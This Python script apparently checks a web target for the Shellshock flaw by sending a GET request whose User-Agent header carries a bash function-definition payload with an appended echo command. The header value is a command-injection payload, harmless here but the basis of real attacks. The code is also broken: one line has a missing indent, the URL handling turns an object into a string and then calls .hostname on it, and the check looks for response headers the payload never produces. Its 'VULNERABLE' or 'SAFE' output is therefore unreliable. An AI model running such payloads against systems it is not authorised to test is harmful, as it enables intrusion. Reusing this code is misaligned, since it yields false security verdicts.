# Shellshock Checker
# Author: cbk914
import argparse
import re
from urllib.parse import urlparse
import http.client

def main():
    # Define command line flag for target URL
    parser = argparse.ArgumentParser(description="Check for Shellshock vulnerability")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    args = parser.parse_args()

    # Check if the provided URL is in valid format
    parsed_url = urlparse(args.url)
    if parsed_url.scheme not in ["http", "https"]:
        parsed_url = "https://" + parsed_url.geturl()
    if not re.match(r"^[a-zA-Z0-9-.]+$", parsed_url.hostname) and not re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", parsed_url.hostname):
    parser.error("Invalid target format. Only URLs with valid hostname or IP address are allowed")

    # Send the request
    conn = http.client.HTTPSConnection(parsed_url.hostname)
    headers = { "User-Agent": "() { :; }; echo; echo; echo; echo; echo; echo; echo; echo; echo; echo; echo; echo; echo; echo; echo 'Vulnerable!'" }
    conn.request("GET", parsed_url.path, headers=headers)
    resp = conn.getresponse()
    conn.close()

    # Check the response
    if resp.status == 200 and ("X-CGI-Shellshock" in resp.headers or "X-Shellshock" in resp.headers):
        print("VULNERABLE: The target is vulnerable to Shellshock.")
    else:
        print("SAFE: The target is not vulnerable to Shellshock.")

if __name__ == "__main__":
    main()
